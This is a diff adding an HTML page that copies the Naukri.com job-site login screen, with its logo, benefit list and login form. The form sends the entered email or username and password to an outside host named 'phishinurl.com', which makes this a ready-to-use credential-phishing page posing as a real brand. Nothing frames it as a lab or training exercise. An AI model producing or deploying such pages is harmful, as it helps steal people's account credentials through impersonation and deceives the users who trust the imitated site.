@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Naukri.com Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            display: flex;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 900px;
+            overflow: hidden;
+        }
+        .info-section {
+            padding: 40px;
+            background-color: #f9f9f9;
+            border-right: 1px solid #ddd;
+            flex: 1;
+        }
+        .info-section h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .info-section ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            margin-bottom: 20px;
+        }
+        .info-section ul li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .info-section ul li::before {
+            content: '✔';
+            color: #00aaff;
+            margin-right: 10px;
+        }
+        .info-section .register-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #00aaff;
+            color: #fff;
+            border-radius: 4px;
+            text-decoration: none;
+        }
+        .login-section {
+            padding: 40px;
+            flex: 1;
+        }
+        .login-section h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .input-container {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+        .input-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #666;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .input-container .show-password {
+            position: absolute;
+            right: 10px;
+            top: 35px;
+            cursor: pointer;
+            color: #0073b1;
+        }
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #0073b1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .btn {
+            background-color: #0073b1;
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .btn:hover {
+            background-color: #005bb5;
+        }
+        .otp-link, .google-btn {
+            display: block;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #0073b1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .google-btn {
+            border: 1px solid #ccc;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .google-btn img {
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="info-section">
+            <img src="data:image/png;base64,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" alt="Naukri Logo" width="150">
+            <h2>New to Naukri?</h2>
+            <ul>
+                <li>One click apply using Naukri profile</li>
+                <li>Get relevant job recommendations</li>
+                <li>Showcase profile to top companies and consultants</li>
+                <li>Know application status on applied jobs</li>
+            </ul>
+            <a href="#" class="register-btn">Register for Free</a>
+        </div>
+        <div class="login-section">
+            <h2>Login</h2>
+            <form action="http://phishinurl.com/?csrf-token=testingtoken" method="GET">
+                <div class="input-container">
+                    <label for="email">Email ID / Username</label>
+                    <input type="text" id="email" name="email" placeholder="Enter Email ID / Username" required>
+                </div>
+                <div class="input-container">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter Password" required>
+                    <span class="show-password" onclick="togglePassword()">Show</span>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot Password?</a>
+                </div>
+                <button type="submit" class="btn">Login</button>
+                <a href="#" class="otp-link">Use OTP to Login</a>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            var passwordField = document.getElementById('password');
+            var showPasswordText = document.querySelector('.show-password');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                showPasswordText.textContent = 'Hide';
+            } else {
+                passwordField.type = 'password';
+                showPasswordText.textContent = 'Show';
+            }
+        }
+    </script>
+</body>
+</html>
